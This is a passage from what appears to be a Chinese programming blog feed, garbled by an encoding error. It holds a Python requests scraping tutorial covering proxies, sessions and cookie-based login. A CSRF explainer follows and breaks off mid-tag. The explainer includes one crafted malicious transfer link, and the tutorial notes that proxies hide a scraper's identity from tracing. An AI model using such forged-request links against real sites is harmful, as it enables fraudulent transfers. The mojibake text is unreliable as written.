åŠä»¥ä¸Šå»ºè®®ä½¿ç”¨ï¼šf-stringï¼Œé‡‡ç”¨ç›´æ¥åœ¨å­—ç¬¦ä¸²ä¸­å†…åµŒå˜é‡çš„æ–¹å¼è¿›è¡Œå­—ç¬¦ä¸²æ ¼å¼åŒ–æ“ä½œ</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">param1 = <span class="string">&#x27;Python&#x27;</span></span><br><span class="line">param2 = <span class="number">2018</span></span><br><span class="line">url =<span class="string">f&quot;https://xxx.com/search.php?key=<span class="subst">&#123;param1&#125;</span>&amp;time=<span class="subst">&#123;param2&#125;</span>&quot;</span></span><br><span class="line">requests.get(url)</span><br></pre></td></tr></table></figure></p><p>å½“ç„¶ï¼Œè€å¼çš„æ–¹æ³•æˆ‘ä»¬ä¹Ÿè¦èƒ½çœ‹æ‡‚ï¼š</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url  =&quot;https://xxx.com/search.php?key=&#123;&#125;&amp;time=&#123;&#125;&quot;.format(param1ï¼Œparam2)</span><br><span class="line">url  =&quot;https://xxx.com/search.php?key=%s&amp;time=%d&quot; % (param1, param2)</span><br></pre></td></tr></table></figure></p><p><strong>æ³¨æ„ï¼šç¼–ç é—®é¢˜</strong></p><p><strong>å¦‚æœä½¿ç”¨ w æ¨¡å¼æ‰“å¼€æ–‡ä»¶å†™å…¥æŠ¥é”™ï¼Œé‚£åœ¨æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œæ·»åŠ encoding å­—æ®µ</strong></p><p>ä½¿ç”¨ â€˜wbâ€™ æ¨¡å¼æ‰“å¼€æ–‡ä»¶å†™å…¥æ²¡æœ‰é—®é¢˜</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = open(&#x27;liyiba-&#x27;+str(i+1)+&#x27;.html&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)</span><br><span class="line">   f.write(response.content.decode())</span><br><span class="line">æˆ–</span><br><span class="line">with open(file_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br></pre></td></tr></table></figure></p><p>ç±»çš„æ¯ä¸ªæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡å‘å®ä¾‹çš„å¼•ç”¨ã€‚åœ¨ç±»çš„æ–¹æ³•ä¸­ä½¿ç”¨ç±»çš„æˆå‘˜æˆ–æ–¹æ³•ä¹Ÿè¦åœ¨å‰é¢åŠ ä¸Šself.</p></li></ol><h2 id="post-è¯·æ±‚">Post è¯·æ±‚</h2><p>å“ªäº›åœ°æ–¹æˆ‘ä»¬ä¼šç”¨åˆ° POST è¯·æ±‚ï¼š</p><ul><li>ç™»å½•æ³¨å†Œï¼ˆPOST æ¯” GET æ›´å®‰å…¨ï¼‰</li><li>éœ€è¦ä¼ è¾“å¤§æ–‡æœ¬å†…å®¹çš„æ—¶å€™ï¼ˆPOST è¯·æ±‚å¯¹æ•°æ®é•¿åº¦æ²¡æœ‰è¦æ±‚ï¼‰æ‰€ä»¥åŒæ ·çš„ï¼Œæˆ‘ä»¬çš„çˆ¬è™«ä¹Ÿéœ€è¦åœ¨è¿™ä¸¤ä¸ªåœ°æ–¹å»æ¨¡æ‹Ÿæµè§ˆå™¨å‘é€ post è¯·æ±‚</li></ul><p>å‘é€ POST è¯·æ±‚ç”¨æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">response=requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>, data=data, headers=headers)</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">dataçš„å½¢å¼ï¼šå­—å…¸</span><br><span class="line">æœ¬ä¾‹ä¸­é€šè¿‡å¿…åº”ç¿»è¯‘çš„ä¾‹å­çœ‹çœ‹ post è¯·æ±‚å¦‚ä½•ä½¿ç”¨</span><br><span class="line"></span><br><span class="line"><span class="comment">## ä»£ç†</span></span><br><span class="line"></span><br><span class="line">[åå‘ä»£ç†ä¸ºä½•å«åå‘ä»£ç†ï¼Ÿ](https://www.zhihu.com/question/<span class="number">24723688</span>)</span><br><span class="line"></span><br><span class="line">[æ­£å‘ä»£ç†ä¸åå‘ä»£ç†çš„åŒºåˆ«](https://www.jianshu.com/p/208c02c9dd1d)</span><br><span class="line"></span><br><span class="line">æ­£å‘ä»£ç†éšè—çœŸå®å®¢æˆ·ç«¯ï¼Œåå‘ä»£ç†éšè—çœŸå®æœåŠ¡ç«¯</span><br><span class="line"></span><br><span class="line">ç”¨æ³•ï¼š</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">requests.getï¼ˆ<span class="string">&quot;http://www.baidu.com&quot;</span>ï¼Œproxies=proxiesï¼‰</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">proxies çš„å½¢å¼ï¼šå­—å…¸</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">proxies = &#123;</span><br><span class="line"><span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://12.34.56.79:9527&quot;</span>,</span><br><span class="line"><span class="string">&quot;https&quot;</span>: <span class="string">&quot;https://12.34.56.79:9527&quot;</span>,</span><br><span class="line">ï½</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">é—®é¢˜ï¼šä¸ºä»€ä¹ˆçˆ¬è™«éœ€è¦ä½¿ç”¨ä»£ç†ï¼Ÿ</span><br><span class="line"></span><br><span class="line">- è®©æœåŠ¡å™¨ä»¥ä¸ºä¸æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯åœ¨è¯·æ±‚</span><br><span class="line"></span><br><span class="line">- é˜²æ­¢æˆ‘ä»¬çš„çœŸå®åœ°å€è¢«æ³„éœ²ï¼Œé˜²æ­¢è¢«è¿½ç©¶</span><br><span class="line"></span><br><span class="line">è·å– requests è·å–æœ¬åœ°ä»¥åŠè¿œç¨‹åœ°å€ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(response.raw._connection.sock.getpeername()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(response.raw._connection.sock.getsockname()[<span class="number">0</span>])</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">å…¶å®æ˜¯è®¿é—®ååº•å±‚çš„å¥—æ¥å­—ï¼Œç„¶åä½¿ç”¨å¥—æ¥å­—çš„æ–¹æ³•è·å–å¥—æ¥å­—çš„å±æ€§</span><br><span class="line"></span><br><span class="line">&gt; In the rare <span class="keyword">case</span> that youâ€™d like to get the raw socket response <span class="keyword">from</span> the server, you can access</span><br><span class="line">&gt; r.raw. If you want to do this, make sure you <span class="built_in">set</span> stream=<span class="literal">True</span> <span class="keyword">in</span> your initial request. Once you do, you can do this</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>,stream = <span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock</span><br><span class="line">&lt;ssl.SSLSocket fd=<span class="number">848</span>, family=AddressFamily.AF_INET, <span class="built_in">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">&#x27;113.54.192.201&#x27;</span>, <span class="number">15592</span>), raddr=(<span class="string">&#x27;182.61.200.7&#x27;</span>, <span class="number">443</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(res.raw._connection.sock)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;ssl.SSLSocket&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.laddr</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">   File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;SSLSocket&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;laddr&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.getpeername()</span><br><span class="line">(<span class="string">&#x27;182.61.200.7&#x27;</span>, <span class="number">443</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.getsockname()</span><br><span class="line">(<span class="string">&#x27;113.54.192.201&#x27;</span>, <span class="number">15592</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.content.decode()</span><br><span class="line">æ­¤å¤„çœç•¥ä¸€ä¸ªhtmlçš„ä»£ç </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.getsockname()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">   File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;sock&#x27;</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">è¿™é‡Œä¸èƒ½ç›´æ¥è®¿é—® laddr å’Œ raddrï¼Œsocket æ²¡æœ‰å°†å…¶æš´éœ²å‡ºæ¥ï¼Œç§æœ‰å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡æ¥å£ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨`getsockname()` è·å¾— `laddr`ã€ `getpeername()` è·å– `raddr`</span><br><span class="line"></span><br><span class="line">å‚è€ƒï¼š[How do I <span class="built_in">print</span> the local <span class="keyword">and</span> remote address <span class="keyword">and</span> port of a connected socket?](https://stackoverflow.com/questions/<span class="number">41250805</span>/how-do-i-<span class="built_in">print</span>-the-local-<span class="keyword">and</span>-remote-address-<span class="keyword">and</span>-port-of-a-connected-socket)</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼šåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¦‚æœåœ¨è°ƒç”¨ response.raw.connection.sock.getpeername() ä¹‹å‰è¿›è¡Œäº†ä¾‹å¦‚ response.text æˆ– response.content çš„è°ƒç”¨ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±ä¼šæŠ¥é”™ï¼šresponse.raw.connection.sock.getpeername()!</span><br><span class="line"></span><br><span class="line">å‚è€ƒï¼š[è·å–python requestsæ¨¡å—è¯·æ±‚çš„ipåœ°å€](https://just4fun.im/<span class="number">2017</span>/08/06/%E8%8E%B7%E5%8F%96python-requests%E6%A8%A1%E5%9D%<span class="number">97</span>%E8%AF%B7%E6%B1%<span class="number">82</span>%E7%9A%84ip%E5%9C%B0%E5%9D%<span class="number">80</span>/)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[åˆ—è¡¨æ¨å¯¼å¼](https://www.runoob.com/note/<span class="number">15802</span>)</span><br><span class="line"></span><br><span class="line">[Pythonçš„å„ç§æ¨å¯¼å¼ï¼ˆåˆ—è¡¨æ¨å¯¼å¼ã€å­—å…¸æ¨å¯¼å¼ã€é›†åˆæ¨å¯¼å¼ï¼‰](https://blog.csdn.net/yjk13703623757/article/details/<span class="number">79490476</span>)</span><br><span class="line"></span><br><span class="line">åŸå› ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> ç®€æ´</span><br><span class="line"><span class="number">2.</span> å› ä¸ºæ‰å¹³è®¾è®¡åµŒå¥—ï¼ˆPython ä¹‹ç¦…ï¼‰</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> python ä¸åŒç¼–è¾‘å™¨ä»¥åŠä¸åŒåœ°æ–¹æ‹·è´ä»£ç æ—¶ï¼Œè¦æ³¨æ„ç¼©è¿›ï¼ŒTab ä¸ ç©ºæ ¼ï¼Œ</span><br><span class="line"><span class="number">2.</span> pythonä¸­å‡ºç°IndentationError:unindent does <span class="keyword">not</span> <span class="keyword">match</span> <span class="built_in">any</span> outer indentation level å°±æ˜¯å› ä¸ºç¼©è¿›ä¸ç©ºæ ¼çš„é—®é¢˜</span><br><span class="line"></span><br><span class="line"><span class="comment">## Requests æ¨¡æ‹Ÿç™»é™†çš„ä¸‰ç§æ–¹å¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### cookie å’Œ session çš„åŒºåˆ«</span></span><br><span class="line"></span><br><span class="line">- Cookie æ•°æ®å­˜æ”¾åœ¨å®¢æˆ·çš„æµè§ˆå™¨ä¸Šï¼Œsession æ•°æ®æ”¾åœ¨æœåŠ¡å™¨ä¸Šã€‚</span><br><span class="line">- cookie ä¸æ˜¯å¾ˆå®‰å…¨ï¼Œåˆ«äººå¯ä»¥åˆ†æå­˜æ”¾åœ¨æœ¬åœ°çš„ cookie å¹¶è¿›è¡Œ |cookie æ¬ºéª—ã€‚</span><br><span class="line">- session ä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚å½“è®¿é—®å¢å¤šï¼Œä¼šæ¯”è¾ƒå ç”¨ä½ æœåŠ¡å™¨çš„æ€§èƒ½ã€‚</span><br><span class="line">- å•ä¸ª cookie ä¿å­˜çš„æ•°æ®ä¸èƒ½è¶…è¿‡ <span class="number">4</span> Kï¼Œå¾ˆå¤šæµè§ˆå™¨éƒ½é™åˆ¶ä¸€ä¸ªç«™ç‚¹æœ€å¤šä¿å­˜ <span class="number">20</span> ä¸ª cookieã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">### çˆ¬è™«å¤„ç† Cookie å’Œ session</span></span><br><span class="line"></span><br><span class="line">å¸¦ä¸Š cookieã€session çš„å¥½å¤„ï¼šèƒ½å¤Ÿè¯·æ±‚åˆ°ç™»å½•ä¹‹åçš„é¡µé¢</span><br><span class="line"></span><br><span class="line">å¸¦ä¸Š cookieã€session çš„å¼Šç«¯ï¼šä¸€å¥— cookie å’Œ session å¾€å¾€å’Œ**ä¸€ä¸ªç”¨æˆ·**å¯¹åº”ã€‚è¯·æ±‚å¤ªå¿«ï¼Œè¯·æ±‚æ¬¡æ•°å¤ªå¤šï¼Œå®¹æ˜“è¢«æœåŠ¡å™¨è¯†åˆ«ä¸ºçˆ¬è™«</span><br><span class="line"></span><br><span class="line">**ä¸éœ€è¦ cookie çš„æ—¶å€™å°½é‡ä¸å»ä½¿ç”¨ cookie**ï¼Œ ä½†æ˜¯ä¸ºäº†**è·å–ç™»å½•ä¹‹åçš„é¡µé¢**ï¼Œæˆ‘ä»¬å¿…é¡»å‘é€å¸¦æœ‰ cookies çš„è¯·æ±‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">####1. æºå¸¦ cookie è¯·æ±‚</span></span><br><span class="line"></span><br><span class="line">- æºå¸¦ä¸€å † cookie è¿›è¡Œè¯·æ±‚ï¼ŒæŠŠ cookie ç»„æˆ cookie æ± </span><br><span class="line"></span><br><span class="line"><span class="comment">#### 2. å¤„ç† cookie ã€session è¯·æ±‚</span></span><br><span class="line"></span><br><span class="line">Requests æä¾›äº†ä¸€ä¸ªå«åš session ç±»ï¼Œæ¥å®ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„ä¼šè¯ä¿æŒ</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> **å®ä¾‹åŒ–**ä¸€ä¸ª session å¯¹è±¡</span><br><span class="line"><span class="number">2.</span> è®© session **å‘é€** get æˆ–è€… post è¯·æ±‚</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">session=requests.session()</span><br><span class="line">response=session.get(url, headers)</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">åŠ¨æ‰‹å°è¯•ä½¿ç”¨ sessionæ¥ç™»å½•äººäººç½‘:</span><br><span class="line"></span><br><span class="line">http://www.renren.com/PLogin.do</span><br><span class="line"></span><br><span class="line"><span class="comment">#### ä½¿ç”¨ requests æä¾›çš„ session ç±»æ¥è¯·æ±‚ç™»é™†ä¹‹åçš„ç½‘ç«™çš„æ€è·¯</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å®ä¾‹åŒ– session</span><br><span class="line"><span class="number">2.</span> å…ˆä½¿ç”¨ session å‘ç™»å½•é¡µé¢çš„è¡¨å•æäº¤ï¼Œ å‘é€ POST è¯·æ±‚ï¼Œç™»å½•ç½‘ç«™ï¼Œsession å¯¹è±¡è‡ªåŠ¨æŠŠ cookie ä¿å­˜åœ¨ session ä¸­</span><br><span class="line"><span class="number">3.</span> å†ä½¿ç”¨ session è¯·æ±‚ç™»é™†ä¹‹åæ‰èƒ½è®¿é—®çš„ç½‘ç«™ï¼Œsession èƒ½å¤Ÿè‡ªåŠ¨çš„æºå¸¦ç™»å½•æˆåŠŸæ—¶ä¿å­˜åœ¨å…¶ä¸­çš„ cookieï¼Œè¿›è¡Œè¯·æ±‚</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">session = requests.session()</span><br><span class="line">post_url = <span class="string">&quot;https://www.****.com//login_check&quot;</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;_username&quot;</span>:<span class="string">&quot;615836359@qq.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;_password&quot;</span>:<span class="string">&quot;*******&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ sessionå‘é€ post è¯·æ±‚,cookie ä¿å­˜åœ¨å…¶ä¸­</span></span><br><span class="line">session.post(post_url, data=post_data, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†ä½¿ç”¨ session è¿›è¡Œè¯·æ±‚ ç™»å½•ä¹‹åæ‰èƒ½è®¿é—®çš„åœ°å€</span></span><br><span class="line">r = session.get(<span class="string">&quot;https://www.***.com/my/orders&quot;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜é¡µé¢</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.content.decode())</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="comment">## å°ç»“</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###è·å–ç™»å½•åçš„é¡µé¢çš„ä¸‰ç§æ–¹å¼</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å®ä¾‹åŒ– sessionï¼Œä½¿ç”¨ session å‘é€ post è¯·æ±‚ï¼Œåœ¨ä½¿ç”¨å®ƒï¼Œè·å–ç™»é™†åçš„é¡µé¢</span><br><span class="line"><span class="number">2.</span> åœ¨ headers ä¸­æ·»åŠ  cookie é”®ï¼Œå€¼ä¸º cookie å­—ç¬¦ä¸²</span><br><span class="line"><span class="number">3.</span> åœ¨è¯·æ±‚æ–¹æ³•ä¸­æ·»åŠ  cookies å‚æ•°ï¼Œæ¥æ”¶å­—å…¸å½¢å¼çš„ cookieã€‚å­—å…¸å½¢å¼çš„ cookie ä¸­çš„é”®æ˜¯ cookie çš„ nameï¼Œå€¼æ˜¯ cookie çš„ value</span><br><span class="line"></span><br><span class="line">   ```</span><br><span class="line">   r = requests.get(url, headers=headers, cookies=cookies)</span><br><span class="line">   ```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¡¥å……</span></span><br><span class="line"></span><br><span class="line">å­—å…¸æ¨å¯¼å¼ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">cookies = &#123;i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>].lstrip():i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookies.split(<span class="string">&#x27;;&#x27;</span>)&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼šå­—å…¸å’Œé›†åˆéƒ½æ˜¯æ— åºçš„</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF æ¼æ´</title>
      <link href="/blog/2019/10/05/websec/csrf/"/>
      <url>/blog/2019/10/05/websec/csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="csrf-æ¼æ´å®šä¹‰">CSRF æ¼æ´å®šä¹‰</h1><p>CSRFï¼ˆCross-Site Request Foreryï¼‰ä¹Ÿè¢«ç§°ä¸º One Click Attack æˆ–è€…Session Ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRF</p><p>XSS ä¸ CSRF åŒºåˆ«ï¼š</p><ol type="1"><li>XSS åˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œç›—å– Cookie</li><li>CSRF é€šè¿‡ä¼ªè£…æˆå—ä¿¡ä»»ç”¨æˆ·è¯·æ±‚å—ä¿¡ä»»çš„ç½‘ç«™</li></ol><h1 id="csrf-æ¼æ´åŸç†">CSRF æ¼æ´åŸç†</h1><p>CSRFæ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¸æ”»å‡»ç½‘ç«™æœåŠ¡å™¨ï¼Œè€Œæ˜¯å†’å……ç”¨æˆ·åœ¨ç«™å†…çš„æ­£å¸¸æ“ä½œï¼Œé€šå¸¸ç”±äºæœåŠ¡ç«¯æ²¡æœ‰å¯¹è¯·æ±‚å¤´åšä¸¥æ ¼è¿‡æ»¤å¼•èµ·çš„ã€‚CSRFä¼šé€ æˆå¯†ç é‡ç½®ã€ç”¨æˆ·ä¼ªé€ ç­‰é—®é¢˜ï¼Œå¯èƒ½å¼•å‘ä¸¥é‡åæœã€‚</p><p>ç»å¤§å¤šæ•°ç½‘ç«™æ˜¯é€šè¿‡ Cookieç­‰æ–¹å¼è¾¨è¯†ç”¨æˆ·èº«ä»½ï¼Œå†äºˆä»¥æˆæƒçš„ã€‚æ‰€ä»¥è¦ä¼ªé€ ç”¨æˆ·çš„æ­£å¸¸æ“ä½œï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯é€šè¿‡XSS æˆ–é“¾æ¥æ¬ºéª—ç­‰é€”å¾„ï¼Œè®©ç”¨æˆ·åœ¨æœ¬æœºï¼ˆå³æ‹¥æœ‰èº«ä»½ cookieçš„æµè§ˆå™¨ç«¯ï¼‰å‘èµ·ç”¨æˆ·é”ä¸çŸ¥é“çš„è¯·æ±‚ã€‚CSRFæ”»å‡»ä¼šä»¤ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ”»å‡»è‡ªå·±å·²ç»ç™»é™†çš„ç³»ç»Ÿã€‚</p><p>åˆ©ç”¨ç›®æ ‡ç”¨æˆ·çš„åˆæ³•èº«ä»½ï¼Œä»¥ç›®æ ‡ç”¨æˆ·çš„åä¹‰æ‰§è¡ŒæŸäº›éæ³•æ“ä½œã€‚</p><p>å¯ä»¥è¿™ä¹ˆç†è§£ CSRFæ”»å‡»ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚CSRFèƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ä½ åä¹‰å‘é€é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œç”šè‡³äºè´­ä¹°å•†å“ï¼Œè™šæ‹Ÿè´§å¸è½¬è´¦.â€¦â€¦é€ æˆçš„ä¸»è¦é—®é¢˜åŒ…æ‹¬ï¼šä¸ªäººéšç§çš„æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚</p><p>ä¾‹å¦‚ï¼šç®€å•çš„è½¬è´¦æ¡ˆä¾‹</p><p>åˆå§‹åŒ–é“¾æ¥ï¼š<code>http://www.xxx.com/pay.php?user=xxx&amp;money=100</code></p><p>é»‘å®¢æ„é€ ä»¥ä¸‹æ¶æ„é“¾æ¥ï¼Œç„¶åè¯±å¯¼ç”¨æˆ·åœ¨ç™»å½•çŠ¶æ€ä¸‹ç‚¹å‡»è¯¥é“¾æ¥ï¼Œä¾¿å¯ä»¥å®ç°å‘è‡ªå·±è½¬è´¦çš„ç›®çš„ã€‚</p><p><code>http://www.xxx.com/pay.php?user=æ¶æ„ç”¨æˆ·&amp;money=10000</code></p><h1 id="æµè§ˆå™¨çš„-cookie-æœºåˆ¶">æµè§ˆå™¨çš„ Cookie æœºåˆ¶</h1><h2 